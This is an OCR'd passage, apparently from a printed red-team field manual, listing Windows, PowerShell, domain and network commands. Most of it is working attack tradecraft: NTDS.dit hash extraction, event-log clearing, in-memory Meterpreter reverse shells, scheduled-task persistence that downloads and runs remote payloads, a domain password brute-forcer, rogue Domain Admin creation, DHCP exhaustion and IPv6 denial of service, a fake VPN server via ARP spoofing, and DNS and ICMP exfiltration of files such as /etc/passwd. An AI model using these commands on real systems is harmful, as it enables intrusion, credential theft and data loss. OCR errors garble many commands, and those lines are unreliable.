+\ \ ?\GLOBALROOT\ Device \ Ha rddiskVolume ShadowCopylX NT DS\NTDS . dit 
+C:\temp\ntds.dit 2 &1 C:\temp\output.txt" 
+
+# Step by step instructions on room362.com for step below 
+
+5. From Linux, download and run ntdsxtract and libesedb to export 
+hashes or other domain information 
+
+a. Additional instructions found under the VSSOWN section 
+
+b. ntdsxtract - http://www.ntdsxtract.com 
+
+c. libesedb - http://code.google.eom/p/libesedb/ 
+
+
+21 
+
+
+POWERSHELL 
+
+
+st op- transcript 
+get-content file 
+get-help command -examples 
+get-command A string. A 
+get-service 
+
+get-wmiobj ect -class win32_service 
+
+$PSVesionTable 
+powershell.exe -version 2.0 
+get-service I measure-object 
+get-psdrive 
+
+get-process | select -expandproperty 
+get-help A -parameter credential 
+get-wmiobject -list ^network 
+[Net. DNS] : : GetHostEntry ( " ip. ") 
+
+
+Stops recording 
+displays file contents 
+Shows examples of command 
+Searches for cmd string 
+Displays services (stop- 
+service, start-service) 
+Displays services, but takes 
+alternate credentials 
+Display powershell version 
+Run powershell 2.0 from 3.0 
+Returns # of services 
+Returns list of PSDrives 
+name Returns only names 
+
+Cmdlets that take creds 
+Available WMI network cmds 
+DNS Lookup 
+
+
+Clear Security & Applciation event log for remote server (SVR01) 
+
+
+Get-EventLog -list 
+
+Clear-EventLog -logname Application, Security -computername SVR01 
+
+
+Export OS info into CSV file 
+
+
+Get-WmiObject -class win32_operatingsystem | select -property 1 | export- 
+
+csv c:\os.txt 
+
+
+List running services 
+
+
+Get-Service | where_object {$_. status -eq "Running"} 
+
+Persistent PSDrive to remote file share: 
+
+
+New-PSDrive -Persist -PSProvider FileSystem -Root \\1 . 1 . 1 . l\tools -Name i 
+
+
+Return files with write date past 8/20 
+
+
+Get-Childltem -Path c:\ -Force -Recurse -Filter A .log -ErrorAction 
+SilentlyContinue | where { $_. LastWriteTime -gt "2012-08-20"} 
+
+File download over HTTP 
+
+
+(new-obj ect system.net. webclient ) . downloadFile ( "url", "dest" ) 
+
+
+TCP PORT CONNECTION (SCANNER) 
+
+
+$ports= (#,#,#); $ip="x.x.x.x"; foreach ($port in $ports ) { try { $socket=New- 
+object System .Net . Sockets . TCPClient ( $ip, $port );} catch{ }; if ($socket -eq 
+$NULL) {echo $ip":"$port" - Closed" ;} else { echo $ip" : "$port " - Open"; $socket 
+= $NULL; } } 
+
+Ping with 500 millisecond timeout 
+
+
+$ping = New-Object System. Net . Networkinformation . ping 
+$ping . Send ( " ip ",500) 
+
+
+22 
+
+
+
+Basic authentication popup 
+
+
+powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass 
+
+$Host . UI . Prompt ForCredential ( " title message user domain " ) 
+
+
+Run EXE every 4 hours between Aug 8-11, 2013 and the hours of 
+0800-1700 (from Cmd.exe) 
+
+powershell.exe -Command "do {if ((Get-Date -format yyyyMMdd-HHmm) -match 
+'2 01308 (0 [8-9] | 1 [0-1] ) - (0 [8-9] 1 1 [ 0 - 1 ]) [0-5] [0-9] ' ) {Start-Process - 
+WindowStyle Hidden "C : \Temp\my . exe" ; Start-Sleep -s 14400 }} while ( 1 ) " 
+
+
+POWERSHELL RUNAS 
+
+
+$pw = convertto-securestring -string "PASSWORD" -asplaintext -force; 
+
+$pp = new-object -typename System. Management .Automation . PSCredential - 
+argumentlist "DOMAINXuser " , $pw; 
+
+Start-Process powershell -Credential $pp -ArgumentList '-noprofile -command 
+&{ Start-Process file.exe -verb runas}' 
+
+Email sender 
+
+
+powershell.exe Send-MailMessage -to " email " -from " email " -subject 
+"Subject" -a " attachment file path" -body "Body" -SmtpServer Target 
+Email Server IP 
+
+Turn on Powershell remoting (with valid credentials) 
+
+
+net time \\ip 
+
+at Wip time "Powershell -Command ' Enable-PSRemoting -Force' 
+at Wip time+1 "Powershell -Command 'Set-Item 
+wsman : \localhost\client\trustedhosts 1 '" 
+
+at Wip time+2 "Powershell -Command 'Restart-Service WinRM'" 
+Enter-PSSession -ComputerName ip -Credential username 
+
+
+List hostname and IP for all domain computers 
+
+
+Get-WmiObj ect -ComputerName DC -Namespace root \microsof tDNS -Class 
+Microsof tDNS_R esourceRecor cl -Filter "domainname= ' DOMAIN '" | select 
+
+text representation 
+
+
+Powershell download of a file from a specified location 
+
+
+powershell.exe -noprofile -noninteractive -command 
+
+" [System. Net . ServicePointManager ] : : ServerCertif icateValidationCallback = 
+
+{ $true } ; $source=" " "https : // YOUR_SPECIFIED_IP / file . zip 
+
+$destination=" " "C : \master . zip" " " ; $http = new-object System . Net . WebClient ; 
+$response = $http . DownloadFile ( $source, $destination) ; " 
+
+Powershell data exfil 
+
+
+Script will send a file ($filepath) via http to server ($server) via POST 
+request. Must have web server listening on port designated in the $server 
+
+powershell.exe -noprofile -noninteractive -command 
+
+" [System. Net . ServicePointManager] : : ServerCertif icateValidationCallback = 
+
+{ $true } ; $server="""http:// 'YOUR_SPECIFIED_IP / folder """; 
+
+$filepath="""C : \master . zip""" ; $http = new-object System . Net .WebClient ; 
+$response = $http . UploadFile ( $server , $ f ilepath) ; " 
+
+23 
+
+
+Using Powershell to Launch Meterpreter from Memory 
+
+
+S Need Metasploit v4.5+ (msf venom supports Powershell) 
+
+S Use Powershell (x86) with 32 bit Meterpreter payloads 
+
+^ encodeMeterpreter . psl script can be found on next page 
+
+On attack boxes 
+
+
+1. ./msfvenom -p windows/meterpreter/reverse_https -f psh -a x86 
+LHOST=l. 1.1.1 LPORT=4 4 3 audit. psl 
+
+2. Move audit. psl into same folder as encodeMeterpreter . psl 
+
+3. Launch Powershell (x86) 
+
+4. powershell.exe -executionpolicy bypass encodeMeterpreter . psl 
+
+5. Copy the encoded Meterpreter string 
+
+Start listener on attack box 
+
+
+1. ./msfconsole 
+
+2. use exploit/multi/handler 
+
+3. set payload windows/meterpreter/reverse_https 
+
+4. set LHOST 1.1. 1.1 
+
+5. set LPORT 443 
+
+6. exploit -j 
+
+On target (must use powershell (x86) ) 
+
+
+1. powershell.exe -noexit -encodedCommand paste encoded Meterpreter 
+string here. 
+
+PROFIT 
+
+
+EncodeMeterpreter . psl [7] 
+
+# Get Contents of Script 
+$contents = Get-Content audit. psl 
+
+# Compress Script 
+
+$ms = New-Object 10 . MemoryStream 
+
+$action = [ 10 . Compression . CompressionMode ]:: Compress 
+
+$cs = New-Object 10 . Compression . DeflateStream ( $ms , $action ) 
+
+$sw = New-Object 10 . StreamWriter ($cs, [Text . Encoding] :: ASCII ) 
+
+$contents i ForEach-Ob j ect { $sw . WriteLine ($_) } 
+
+$sw . Close ( ) 
+
+# Base64 Encode Stream 
+
+$code = [Convert ]:: ToBase64String ( $ms . ToArray () ) 
+
+$command = "Invoke-Expression ' $ (New-Obj ect 10 . StreamReader ( ' $ (New-Obj ect 
+10 . Compression . DeflateStream ('$ (New-Obj ect 10 .MemoryStream 
+( , ' $ ( [Convert] : : FromBase64String ( ' "$code '")))), 
+
+[ 10 . Compression . CompressionMode ] : :Decompress) ) , 
+
+[Text . Encoding] : : ASCII) ) .ReadToEndO ; " 
+
+# Invoke-Expression $command 
+
+$bytes = [System. Text .Encoding] : : Unicode . GetBytes ($ command! 
+$encodedCommand = [ Convert ]:: ToBase64String ( $bytes ) 
+
+# Write to Standard Out 
+Write-Host $encodedCommand 
+
+Copyright 2012 TmstedSec, LLC. All rights reserved. 
+
+Please see reference [7] for disclaimer 
+
+
+24 
+
+
+
+Using Powershell to Launch Meterpreter ( 2 nd method) 
+
+
+On BT attack box 
+
+
+1. msfpayload windows/meterpreter/rever se_tcp LHOST=10 . 1 . 1 . 1 
+LPORT=8080 R | msfencode -t psh -a x86 
+
+
+On Windows attack box 
+
+
+1. c:\ powershell 
+
+2. PS c:\ $cmd = ' PASTE THE CONTENTS OF THE PSH SCRIPT HERE 
+
+3. PS c:\ $u = [System. Text .Encoding] : : Unicode . GetBytes ($cmd) 
+
+4. PS c:\ $e = [Convert] : : ToBase64String ($u) 
+
+5. PS c:\ $e 
+
+6. Copy contents of $e 
+
+Start listener on attack box 
+
+
+1. ./msfconsole 
+
+2. use exploit/multi/handler 
+
+3. set payload windows/meterpreter/reverse_tcp 
+
+4. set LHOST 1.1. 1.1 
+
+5. set LPORT 8080 
+
+6. exploit -j 
+
+On target shell (1: download shellcode, 2: execute) 
+
+
+1. c:\ powershell -noprofile -noninteractive -command "& 
+
+{ $client=new-obj ect 
+
+System .Net . WebClient ; $ client . DownloadFile ( ' http ://l. 1.1.1/ shell.txt 
+' , ' c : \windows\temp\_shell . txt ' ) } " 
+
+2. c:\ powershell -noprofile -noninteractive -noexit -command "& 
+{$cmd=type ' c : \windows\temp\_shell . txt powershell -noprofile - 
+noninteractive -noexit -encodedCommand $cmd}" 
+
+PROFIT 
+
+
+25 
+
+
+
+Windows Registry 
+
+
+OS INFORMATION 
+
+
+HKLMXSof tware\Microso ft XWindows NTXCurrentVersion 
+
+
+Product name 
+
+
+HKLMXSof tware\Microsoft\Windows NT\CurrentVersion /v 
+ProductName 
+
+
+Date of install 
+
+
+HKLM\Software\Microsof t\Windows NTXCurrentVersion /v InstallDate 
+
+
+Registered owner 
+
+
+HKLM\Software\Microsoft\Windows NTXCurrentVersion /v RegisteredOwner 
+
+
+System root 
+
+
+HKLM\Software\Microsoft\Windows NTXCurrentVersion /v SystemRoot 
+
+
+Time zone (offset in minutes from UTC) 
+
+
+HKLM\ Sy st em\ Cur rent ControlSetXControlX Time Zone Information /v ActiveTimeBias 
+
+
+Mapped network drives 
+
+
+HKCUX So f t wa r e\Mi cro sof t X Windows \ Cur r entVer si on\ Explore r\Map Network Drive 
+MRU 
+
+Mounted devices 
+
+
+HKLM\System\MountedDe vices 
+
+
+USB devices 
+
+
+HKLM\System\CurrentControlSet\Enum\USBStor 
+
+
+Turn on IP forwarding 
+
+
+HKE Y_LOCAL_MACHINE\SYSTEM\ Cur rentControlSetXSer vices \Tcpip\ Parameters - 
+I PEnableRouter = 1 
+
+Password keys: LSA secrets can contain VPN, Autologon, other 
+passwords 
+
+HKEY_LOCAL_MACHINE\ SecurityX Pol icy X Secrets 
+
+HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\autoadminlogon 
+
+
+Audit policy 
+
+
+HKLMXSecur ityXPolicyX PolAdTev 
+
+
+26 
+
+
+
+Kernel/user services 
+
+
+HKLM\Software\Microsoft\Windows NT \ Cur rent ControlSetX Services 
+
+
+Installed software on machine 
+
+
+HKLM\ Software 
+
+
+Installed software for user 
+
+
+HKCU\Software 
+
+
+Recent documents 
+
+
+HKCU\ Sof twar e\tlfcrosoft\Windows\CurrentVersion\ Explorer \ Recent Docs 
+
+
+Recent user locations 
+
+
+HKCU\ Sof twar e\Microsoft\ Windows \CurrentVersion\ Explorer \ComDlg32\ Las tVi site 
+dMRU & \OpenSaveMRU 
+
+
+Typed URLs 
+
+
+HKCU\ Sof twar e\Microsoft\ Internet Explore r\TypedURLs 
+
+
+MRU LISTS 
+
+
+HKCU\Sof t ware \Mi crosof t\Windows\ Cur rentVersion\ Explorer \RunMRU 
+
+
+Last registry key accessed 
+
+
+HKCUYSof tware\Microsof t\Windows\CurrentVersion\Applet s\RegEdit /v Last Key 
+
+
+Startup locations 
+
+
+HKLM\Software\Microsoft\Windows\CurrentVersion\Run & \Runonce 
+HKLM\SOFTWARE\Microsof t\ Windows \Cur rent Vers ion\ Pol icies\Explor er\ Run 
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run & \Runonce 
+HKCU\Software\Microsof t\Windows NTXCurrentVer sion\Windows\Load & \Run 
+
+
+27 
+
+
+Enumerating Windows Domain with dsquery 
+
+
+List users on domain with no limit on results 
+
+dsquery user -limit 0 
+
+List groups for domain=victim . com 
+
+dsquery group "cn=users, dc=victim, dc=com" 
+
+List Domain Admin accounts 
+
+dsquery group -name "domain admins" | dsget group -members -expand 
+
+
+List all groups for a user 
+
+dsquery user -name bob K | dsget user -memberof -expand 
+
+Get a user' s login id 
+
+
+dsquery user -name bob* | dsget user -samid 
+
+
+List accounts inactive for 2 weeks 
+
+
+dsquery user -inactive 2 
+
+
+Add domain user 
+
+
+dsadd user "CN=Bob, CN=Users, DC=victim, DC=com" -samid bob -pwd bobpass - 
+display "Bob" -pwdneverexpires yes -memberof "CN=Domain 
+Admins, CN=Users, DC=victim, DC=com 
+
+
+Delete user 
+
+
+dsrm -subtree -noprompt "CN=Bob, CN=Users, DC=victim, DC=com" 
+
+
+List all operating systems on domain 
+
+
+dsquery * "DC=victim, DC=com" -scope subtree -attr "cn" "operat ingSystem" 
+"opera tingSystemService Pack" -filter 
+
+" (& (objectclass=computer) (obj ectcategory=computer); (operatingSystem=Windows * 
+) ) " 
+
+List all site names 
+
+
+dsquery site -o rdn -limit 0 
+
+List all subnets within a site 
+
+
+dsquery subnet -site sitename -o rdn 
+
+
+List all servers within a site 
+
+
+dsquery server -site sitename. -o rdn 
+
+
+28 
+
+
+
+Find servers in the domain 
+
+
+dsquery y domainroot -filter 
+
+" (& ( obj ectCategory=Computer ) (objectClass=Computer ) (operatingSystem => Server A 
+) ) " -limit 0 
+
+Domain controllers per site 
+
+
+dsquery * "CN=Sites, CN=Conf iguration, DC=f orestRootDomain" -filter 
+(obj ectCategory=Server ) 
+
+
+29 
+
+
+
+Windows Scripting 
+
+A If scripting in batch file, variables must be preceeded with %%, i.e. %%i 
+
+Nested for loop ping sweep 
+
+for /L %i in (10,1,254) do @ (for /L %x in (10,1,254) do @ ping -n 1 -w 100 
+10.10.%i.%x 2 nul | find "Reply" && echo 10.10.%i.%x live.txt) 
+
+Loop through file 
+
+for /F %i in ( file ) do command 
+
+Domain brute forcer 
+
+for /F %n in (names.txt) do for /F %p in (pawds.txt) do net use \\DC01\IPC$ 
+/user: domain \%n %p 1 NUL 2 &1 && echo %n:%p && net use /delete 
+\\DC01\IPC$ . NUL 
+
+Account lockout (lockout.bat) 
+
+
+@echo Test run: 
+
+for /f %%U in (list.txt) do @for /I %%C in (1,1,5) do @echo net use \\WIN- 
+1234\c$ /USER:%%U wrongpass 
+
+DHCP EXHAUSTION 
+
+
+for /L %i in (2,1,254) do (netsh interface ip set address local static 
+1 . 1 . 1 . %i netmask gw ID %1 ping 12" . 0.0.1 -n 1 -w 10000 nul %1) 
+
+
+DNS REVERSE LOOKUP 
+
+
+for /L %i in (100, 1,105) do @ nslookup 1 . 1 . 1 . %i | findstr /i /c:"Name" 
+dns.txt && echo Server: 1 . 1 . 1 . %i dns.txt 
+
+Search for files beginning with the word "pass" and then print if 
+
+IT ’ S A DIRECTORY , FILE DATE/TIME , RELATIVE PATH , ACTUAL PATH AND 
+SIZE ( @ VARIABLES ARE OPTIONAL) 
+
+forfiles /P c:\temp /s /m pass* -c "cmd /c echo @isdir Sfdate @ftime 
+Qrelpath @path Qfsize" 
+
+
+Simulate malicious domain callouts (useful for AV/IDS testing) 
+
+
+# Run packet capture on attack domain to receive callout 
+
+# domains.txt should contain known malicious domains 
+
+for /L %i in (0,1,100) do (for /F %n in (domains.txt) do nslookup %n 
+attack domain NUL 2 &1 & ping ~n 5 127.0.0.1 NUL 2 &1 
+
+IE WEB LOOPER (TRAFFIC GENERATOR) 
+
+
+for /L %C in (1,1,5000) do @for %U in (www.yahoo.com www.pastebin.com 
+www.paypal.com www.craigslist.org www.google.com) do start /b iexplore %U & 
+ping -n 6 localhost & taskkill /F /IM iexplore.exe 
+
+
+30 
+
+
+
+Get permissions on service executables 
+
+
+for /f "tokens=2 delims- ' *= ' " %a in ('wmic service list full ' | find /i 
+"pathname" | find /i /v "system32"’) do @echo %a 
+c : \ windows! tempi 3a fd4ga . tmp 
+
+for /f eol = " delims= " %a in (c:\windows\temp\3afd4ga.tmp) do cmd.exe 
+/c icacls "%a" 
+
+
+Rolling reboot (replace /r with /s for a shutdown) : 
+
+
+for /L %i in (2,1,254) do shutdown /r /m \\1 . 1,1 . %i /f /t 0 /c "Reboot 
+message" 
+
+
+Shell escalation using VBS (Need elevated credentials) 
+
+
+# Create . vbs script with the following 
+
+Set shell 1 wscript . createobj ect ( "wscript . shell " ) 
+
+Shell. run "runas /user: user " & """" & 
+
+C: \Windows\System32\WindowsPowershell\vl . OXpowershell . exe -WindowStyle 
+hidden -NoLogo -Noninteractive -ep bypass -nop -c \" & """" & "IEX ( (New- 
+Object Net .WEbClient ). downloadstring ( ' url f ))\" & """" & """" 
+wscript . sleep (100) 
+
+shell . Sendkeys " password " & "{ENTER}" 
+
+
+31 
+
+
+
+Task Scheduler 
+
+
+A Scheduled tasks binary paths CANNOT contain spaces because everything 
+after the first space in the path is considered to be a command-line 
+argument. Enclose the /TR path parameter between backslash (\) AND 
+quotation marks ("): 
+
+... /TR "V'C : \Program FilesXf ile . exe\ " -x argl" 
+
+Task Scheduler (ST= start time, SD=start date, ED=end date) 
+
+*MUST BE ADMIN 
+
+SCHTASKS /CREATE /TN Task Name /SC HOURLY /ST HH:MM. /F /RL HIGHEST /SD 
+MM/DD/YYYY /ED MM/DD/YYYY /tr "C:\m 7 .exe" /RU DOMAIN\user /RP 
+password 
+
+
+Task scheduler persistence [10] 
+
+
+•‘For 64 bit use: 
+
+"C: \Windows\syswow64\WindowsPowerShell\vl . OXpowershell .exe" 
+
+# (x 86 ) on User Login 
+
+SCHTASKS /CREATE /TN Task Name /TR 
+
+"C : \Wi ndows \ Sy stem3 2 \ Windows Power She 11 \vl . OXpowershell . exe -WindowStyle 
+hidden -NoLogo -Noninteractive -ep bypass -nop -c 'IEX ( (new-object 
+net . webclient ). downloadstring (' ' http : // ip. : port/ payload ' /SC 
+onlogon /RU System 
+
+# (x 86 ) on System Start 
+
+SCHTASKS /CREATE /TN Task Name /TR 
+
+"C : \Windows\System32\WindowsPowerShell\vl . 0\power shell . exe -WindowStyle 
+hidden -NoLogo -Noninteractive -ep bypass -nop -c 'IEX ( (new-object 
+net . webclient ). downloadstring ( w http : // ip : port / payload /SC 
+
+onstart /RU System 
+
+# (x 86 ) on User Idle (30 Minutes) 
+
+SCHTASKS /CREATE /TN Task Name. /TR 
+
+"C : \Windows\System32\WindowsPowerShell\vl . 0\ power she 11 . exe -WindowStyle 
+hidden -NoLogo -Noninteractive -ep bypass -nop -c 'IEX ( (new-object 
+net . webclient ). downloadstring ( w http : // ip : port / payload ' f ' ) ) ' " /sc 
+onidle /i 30 
+
+
+32 
+
+
+
+33 
+
+
+
+Networking 
+
+
+34 
+
+
+
+Common Ports 
+
+
+21 
+
+FTP 
+
+520 
+
+RIP 
+
+22 
+
+SSH 
+
+546/" 
+
+DHCPv6 
+
+23 
+
+Telnet 
+
+58" 
+
+SMTP 
+
+25 
+
+SMTP 
+
+902 
+
+VMWare 
+
+49 
+
+TACACS 
+
+1080 
+
+Socks Proxy 
+
+53 
+
+DNS 
+
+1194 
+
+VPN 
+
+6"/8 
+
+DHCP ( UDP ) 
+
+1433/4 
+
+MS-SQL 
+
+69 
+
+TFTP (UDP) 
+
+1521 
+
+Oracle 
+
+80 
+
+HTTP 
+
+1629 
+
+DameWare 
+
+00 
+
+00 
+
+Kerberos 
+
+2049 
+
+NFS 
+
+110 
+
+POP3 
+
+3128 
+
+Squid Proxy 
+
+111 
+
+RPC 
+
+3306 
+
+MySQL 
+
+123 
+
+NTP (UDP) 
+
+3389 
+
+RDP 
+
+135 
+
+Windows RPC 
+
+5060 
+
+SIP 
+
+13" 
+
+NetBIOS 
+
+5222 
+
+Jabber 
+
+138 
+
+NetBIOS 
+
+5432 
+
+Postgres 
+
+139 
+
+SMB 
+
+5666 
+
+Nagios 
+
+143 
+
+IMAP 
+
+5900 
+
+VNC 
+
+161 
+
+SNMP (UDP) 
+
+6000 
+
+Xll 
+
+1" 9 
+
+BGP 
+
+6129 
+
+DameWare 
+
+201 
+
+AppleTalk 
+
+666" 
+
+IRC 
+
+389 
+
+LDAP 
+
+9001 
+
+Tor 
+
+443 
+
+HTTPS 
+
+9001 
+
+HSQL 
+
+445 
+
+SMB 
+
+9090/1 
+
+Openf ire 
+
+500 
+
+ISAKMP (UDP) 
+
+9100 
+
+Jet Direct 
+
+514 
+
+Syslog 
+
+
+
+
+TTL Fingerprinting 
+
+
+Windows 
+
+128 
+
+Linux 
+
+64 
+
+Network 
+
+255 
+
+Solaris 
+
+255 
+
+
+35 
+
+
+
+IPv4 
+
+
+Classful IP ranges 
+
+
+A 0.0. 0.0 
+B 128.0.0.0 
+C 192.0.0.0 
+D 224.0.0.0 
+E 240.0.0.0 
+
+
+12^.255.255.255 
+
+191.255.255.255 
+
+223.255.255.255 
+
+239.255.255.255 
+
+255.255.255.255 
+
+
+Reserved ranges 
+
+
+10.0. 0.0 - 10.255.255.255 
+
+127.0. 0.0 - 127 .255.255.255 
+
+172.16.0. 0 - 1~2. 31 .255.255 
+
+192.168.0. 0 - 192.168.255.255 
+
+
+Subnetting 
+
+
+/31 
+
+255.255.255.254 
+
+1 Host 
+
+/30 
+
+255.255.255.252 
+
+2 Hosts 
+
+/2 9 
+
+255.255.255.248 
+
+6 Hosts 
+
+/28 
+
+255.255.255.240 
+
+14 Hosts 
+
+/2' 7 
+
+255.255.255.224 
+
+30 Hosts 
+
+/2 6 
+
+255.255.255.192 
+
+62 Hosts 
+
+/ 25 
+
+255.255.255.128 
+
+126 Hosts 
+
+/24 
+
+255.255.255.0 
+
+254 Hosts 
+
+/23 
+
+255.255.254.0 
+
+510 Hosts 
+
+/ 22 
+
+255.255.252.0 
+
+1022 Hosts 
+
+/2 1 
+
+255.255.248.0 
+
+2046 Hosts 
+
+/ 20 
+
+255.255.240.0 
+
+4094 Hosts 
+
+/1 9 
+
+255.255.224.0 
+
+8190 Hosts 
+
+/18 
+
+255.255.192.0 
+
+16382 Hosts 
+
+/II 
+
+255.255.128.0 
+
+32^66 Hosts 
+
+/ 1 6 
+
+255.255.0.0 
+
+65534 Hosts 
+
+/ 15 
+
+255.254.0.0 
+
+1310^0 Hosts 
+
+/ 14 
+
+255.252.0.0 
+
+262142 Hosts 
+
+/ 13 
+
+255.248.0.0 
+
+524286 Hosts 
+
+/12 
+
+255.240.0.0 
+
+1048574 Hosts 
+
+/II 
+
+255.224.0.0 
+
+209' 7 150 Hosts 
+
+/10 
+
+255.192.0.0 
+
+4194302 Hosts 
+
+/ 9 
+
+255.128.0.0 
+
+8388606 Hosts 
+
+/ 8 
+
+255.0.0.0 
+
+16~"~214 Hosts 
+
+
+Calculating subnet range 
+
+
+Given: 1.1.1.101/28 
+
+S /28 =* 255.255.255.240 netmask 
+
+S 256 - 240 = 16 = subnet ranges of 16, i.e. 
+
+1 . 1 . 1.0 
+1.1.1.16 
+1.1.1.32. . . 
+
+S Range where given IP falls: 1.1.1.96 - 1.1.1.111 
+
+
+36 
+
+
+
+IPv6 
+
+
+Broadcast addresses 
+
+
+f f 02 : : 1 - link-local nodes 
+ff05::l - site-local nodes 
+ff01::2 - node-local routers 
+ff02::2 - link-local routers 
+ff05::2 - site-local routers 
+
+
+Interface addresses 
+
+
+fe80:: - link-local 
+2001:: - routable 
+
+::a.b.c.d - IPv4 compatible IPv6 
+: : f f f f : a . b . c . d - IPv4 mapped IPv6 
+
+
+THC IPv6 TOOLKIT 
+
+
+Remote Network DoS: 
+
+rsumrf6 eth# remote_ipv6 
+
+
+SOCAT TUNNEL IPv6 THROUGH IPv4 TOOLS 
+
+
+socat TCP-LISTEN: 8080, reuseaddr, fork TCP6 : [ 2001 : : ] : 80 
+./nikto.pl -host 12". 0.0.1 -port 8080 
+
+
+3 ~ 
+
+
+Cisco Commands 
+
+
+
+
+-enable 
+
+#configure terminal 
+(config) #interface faO/O 
+
+(config-if ) #ip addr 1.1. 1.1 255.255.255.0 
+
+(config) #line vty 0 4 
+
+(config-line) #login 
+
+(config-line) #password password 
+
+#show session 
+
+#show version 
+
+#dir file systems 
+
+#dir all-filesystems 
+
+#dir /all 
+
+#show running-conf ig 
+#show startup-conf ig 
+#show ip interface brief 
+#show interface eO 
+#show ip route 
+#show access-lists 
+#terminal length 0 
+
+#copy running-conf ig startup-conf ig 
+#copy running-conf ig tftp 
+
+
+Enter privilege mode 
+Configure interface 
+Configure FastEthernet 0/0 
+Add IP to fa0/0 
+Configure vty line 
+
+1. Set telnet password 
+
+2. Set telnet password 
+Open sessions 
+
+IOS version 
+Available files 
+File information 
+Deleted files 
+Config loaded in mem 
+Config loaded at boot 
+Interfaces 
+
+Detailed interface info 
+Routes 
+
+Access lists 
+No limit on output 
+Replace run w/ start config 
+Copy run config to TFTP Svr 
+
+
+Cisco IOS 11.2-12.2 vulnerability 
+
+
+http:// ip /level/ 16-99 /exec/show/conf ig 
+
+
+SNMP 
+
+
+Must start TFTP server 1 st 
+
+
+. /snmpblow.pl -s srcip. -d rtr_ip -t attackerip -f out.txt 
+snmpstrings . txt 
+
+
+Windows running services: 
+
+
+snmpwalk -c public -vl ip 1 I grep hrSWRunName | cut -d" " -f4 
+
+
+Windows open TCP ports: 
+
+
+smpwalk ... | grep tcpConnState [ cut -d" " -f6 | sort -u 
+
+
+Windows installed software: 
+
+- smpwalk ... | grep hrSWInstalledName 
+
+Windows users: 
+
+- snmpwalk ... ip 1.3 I grep 77.1.2.25 ... -f4 
+
+
+38 
+
+
+
+Packet Capturing 
+
+
+Capture TCP traffic on port 22-23 
+
+tcpdump -nvvX -sO -i ethO tcp portrange 22-23 
+
+Capture traffic to specific IP excluding specific subnet 
+
+tcpdump -I ethO -tttt dst ip and not net 1.1.1.0/24 
+
+Capture traffic b/w local-192.1 
+
+tcpdump net 192.1.1 
+
+Capture traffic for <sec> seconds 
+
+dumpcap -I ethO -a duration: sec -w file file.pcap 
+
+Replay pcap 
+
+file2cable -i ethO -f file.pcap 
+
+Replay packets (fuzz | DoS) 
+
+tcpreplay — topspeed — loop=0 — intf=eth0 . pcap_f ile_to_replay -- 
+mbps=10 | 100 | 1000 
+
+
+% 
+
+’ DNSRecon 
+
+
+DNS 
+
+
+Reverse lookup for IP range: 
+
+. /dnsrecon . rb -t rvs -i 192.1.1.1,192.1.1.20 
+
+Retrieve standard DNS records: 
+
+. /dnsrecon . rb -t std -d domain.com 
+
+Enumerate subdomains: 
+
+. /dnsrecon . rb -t brt -d domain.com -w hosts.txt 
+
+DNS zone transfer: 
+
+./dnsrecon -d domain.com -t axfr 
+
+Nmap Reverse DNS lookup and output parser 
+
+
+nmap -R -sL -Pn -dns-servers dns svr ip range | awk ' { if ( ( $1" "$2 
+"$3 ) = =,, Nmap scan report" ) print$5" "$6}' | sed 's/(//g' | sed 's/)//g' 
+
+dns . txt 
+
+
+39 
+
+
+VPN 
+
+
+Write PSK to file 
+
+
+■ ike-scan -M -A vpn_ip -P file 
+
+DOS VPN SERVER 
+
+
+ike-scan -A -t 1 — sourceip= spoof_ip dst_ip 
+
+FIKED - FAKE VPN SERVER 
+
+
+S Must know the VPN group name and pre-shared key 
+
+1 . Ettercap filter to drop IPSEC traffic (UDP port 500) 
+if (ip. proto == UDP && udp.src == 500) { 
+
+kill ( ) ; 
+drop ( ) ; 
+
+msg ( " ' A 1 A UDP packet dropped 
+
+} 
+
+2. Compile filter 
+
+• etterfilter udpdrop . filter -o udpdrop.ef 
+
+3. Start Ettercap and drop all IPSEC traffic 
+#ettercap -T -q -M arp -F udpdrop.ef // // 
+
+4. Enable IP Forward 
+
+echo "1" /proc/sys/net/ipv4/ip_f orward 
+
+5. Configure IPtables to port forward to Fiked server 
+
+iptables -t nat -A PREROUTING -p udp -I ethO -d VPN Server IP. -j 
+DNAT - - to Attacking Host IP. 
+iptables -P FORWARD ACCEPT 
+
+6. Start Fiked to impersonate the VPN Server 
+
+fiked - g vpn gateway ip - k VPN Group Name: Group Pre-Shared Key 
+7 . Stop Ettercap 
+
+8. Restart Ettercap without the filter 
+ettercap -T -M arp // // 
+
+
+Putty 
+
+Reg key to have Putty log everything (including conversations) 
+
+
+[HKEY_CURRENT_USER\Sof tware\SimonTatham\ Putt y\ Sessions \ Default % 2 OSettings] 
+M LogFileName"=" %TEMP%\putty.dat" 
+
+"LogType"=dword : 00000002" 
+
+
+40 
+
+
+
+41 
+
+
+Tips and Tricks 
+
+
+42 
+
+
+File Transfer 
+
+
+FTP THROUGH NON-INTERACTIVE SHELL 
+
+
+echo open ip 21 . ■ ftp.txt 
+echo user ftp.txt 
+
+echo pass ftp.txt 
+
+echo bin ftp.txt 
+
+echo GET file ftp.txt 
+
+echo bye ftp.txt 
+
+ftp -s:ftp.txt 
+
+
+DNS TRANSFER ON LINUX 
+
+
+On victim: 
+
+1. Hex encode the file to be transferred 
+
+xxd -p secret file. hex 
+
+2. Read in each line and do a DNS lookup 
+
+for b in 'cat file. hex do dig $b . shell . evilexample . com; done 
+
+On attacker: 
+
+1. Capture DNS exfil packets 
+
+tcdpump -w /tmp/dns -sO port 53 and host system.example.com 
+
+2. Cut the exfilled hex from the DNS packet 
+
+tcpdump -r dnsdemo -n | grep shell.evilexample.com | cut -f9 -d’ ' | 
+
+cut -fl -d' . ' | uniq received.txt 
+
+3. Reverse the hex encoding 
+
+xxd -r -p receivedu.txt keys.pgp 
+
+Exfil command output on a Linux machine over ICMP 
+
+
+On victim (never ending 1 liner) : 
+
+stringZ='cat /etc/passwd | od -txl | cut -c8- | tr -d " " | tr -d "\n" 
+counter=0; while ( ($counter = $ { #stringZ } ) ) ; do ping -s 16 -c 1 -p 
+$ {stringZ : $counter : 16} 192.168.10.10 && 
+counter=$ ( (counter+16) ) ;done 
+
+On attacker (capture packets to data.dmp and parse): 
+tcpdump -ntvvSxs 0 , icmp[0]=8 F data.dmp 
+
+grep 0x0020 data.dmp | cut -c21- | tr -d " " | tr -d "\n" I xxd -r -p 
+
+Open Mail Relay 
+
+C:\ telnet x.x.x.x 25 
+HELO x.x.x.x 
+MAIL FROM: me@you.com 
